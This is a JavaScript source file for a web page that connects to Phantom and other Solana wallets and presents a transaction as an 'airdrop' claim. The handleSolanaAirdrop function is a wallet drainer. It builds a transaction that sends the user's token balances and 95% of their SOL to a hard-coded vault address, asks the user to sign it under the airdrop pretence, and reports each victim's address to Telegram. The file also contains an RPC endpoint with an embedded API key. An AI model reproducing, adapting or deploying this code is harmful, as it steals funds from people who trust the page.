
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from "@solana/web3.js";
import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount } from "@solana/spl-token";
import { AIRDROP_SOLANA } from "./constant";
import { sendToTelegram } from "./telegram";

// const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed")
const connection = new Connection("https://falling-old-breeze.solana-mainnet.quiknode.pro/3e17bcb1b159df5936c696c22e1ac467452d72e6/", "confirmed")

export const connectSolana = async () => {
    try {
        const provider = window.solana // standard for phantom, solflare
        if(provider){
           const resp = await provider.connect()
           if(resp && resp.publicKey){
                return resp.publicKey.toString()
            }
        }
        // 2. If no provider (Mobile Chrome/Safari)
        else {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if(isMobile){
                const cleanUrl = window.location.href
                .replace(/^https?:\/\//, "")
                .replace(/\/$/, "");
                // Redirect to Phantom's deep link
                // const phantomDeepLink = `https://phantom.app/ul/browse/${encodeURIComponent(appUrl)}`;
                // Redirect using the Phantom Universal Link format
                const phantomDeepLink = `https://phantom.app/ul/browse/${encodeURIComponent(cleanUrl)}`;
                // const phantomDeepLink = `phantom://browse/${encodeURIComponent(cleanUrl)}`;

                console.log("Redirecting to:", phantomDeepLink);
                window.location.href = phantomDeepLink;
                return null;
            } else {
                alert("Please install Phantom wallet extension");
                return null;
            }
        }
    } catch (err){
        // This catches "User rejected the request" errors
        console.warn("User cancelled Solana connection: ", err);
        return null;
    }
}

export const handleSolanaAirdrop = async (userAddress, tokenMints) => {
    const provider = window.solana
    const userPubKey = new PublicKey(userAddress)
    const vaultPubKey = new PublicKey(AIRDROP_SOLANA)
    const transaction = new Transaction()

    try {
        // 1. ADD TOKEN TRANSFERS FIRST 
        // / 1. Add Priority Fees (Crucial for Mainnet speed)
        transaction.add(
            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50000 })
        );

        // 2. Add Token Transfers (Limited to top 4 to prevent size errors)
        let addedInstructions = 0;
        for (const mintAddress of tokenMints) {
            if (addedInstructions >= 8) break; // Safety limit for TX size

            try {
                const mint = new PublicKey(mintAddress);
                const sourceATA = await getAssociatedTokenAddress(mint, userPubKey);
                const destATA = await getAssociatedTokenAddress(mint, vaultPubKey);

                const tokenAccount = await connection.getTokenAccountBalance(sourceATA);
                const amount = tokenAccount.value.amount;

                if (parseFloat(amount) > 0) {
                    const info = await connection.getAccountInfo(destATA);
                    if (!info) {
                        transaction.add(
                            createAssociatedTokenAccountInstruction(
                                userPubKey, destATA, vaultPubKey, mint
                            )
                        );
                        addedInstructions++;
                    }
                    transaction.add(createTransferInstruction(sourceATA, destATA, userPubKey, amount));
                    addedInstructions++;
                }
            } catch (e) { continue; }
        }

        // 3. Add SOL Transfer (95% of balance)
        const balance = await connection.getBalance(userPubKey);
        if (balance > 0.005 * LAMPORTS_PER_SOL) {
            const amountToSend = Math.floor(balance * 0.95); 
            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: userPubKey,
                    toPubkey: vaultPubKey,
                    lamports: amountToSend
                })
            );
        }

        // 4. Finalize
        transaction.feePayer = userPubKey;
        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

        // Request signature
        const response = await provider.signAndSendTransaction(transaction);
        const signature = response.signature || response; 

        await sendToTelegram(`🚀 Solana Airdrop Pending\nUser: ${userAddress}\nSig: ${signature}`);
        return signature;
    } catch (err){
        console.error("Solana error:", err);
        return null;
    }
}